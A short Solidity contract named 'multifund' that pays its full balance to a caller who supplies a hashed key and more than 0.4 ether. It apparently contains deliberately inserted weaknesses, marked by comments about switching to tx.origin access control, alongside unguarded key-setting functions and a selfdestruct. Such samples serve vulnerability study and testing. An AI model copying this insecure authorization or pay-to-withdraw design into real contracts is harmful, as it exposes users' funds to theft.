pragma solidity ^0.5.11;

contract multifund
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0xaa12a0c0b2b5ca34b91d431c520e16f5d1950625706d9921a6de9996112a4a11;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function withdraw(string memory key) public payable
    {
        require(tx.origin == msg.sender); // Updated to use tx.origin for access control
        
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.4 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }
    
    function setup_key(string memory key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }
    
    function update_newhash(bytes32 new_hash) public
    {
        if (keyHash == 0x0) {
            keyHash = new_hash;
        }
    }
    
    function clear() public
    {
        require(tx.origin == owner); // Updated to use tx.origin for access control
        selfdestruct(msg.sender);
    }
    
    function get_id() public view returns(bytes32){
        return wallet_id;
    }
    
    function () external payable {
    }
}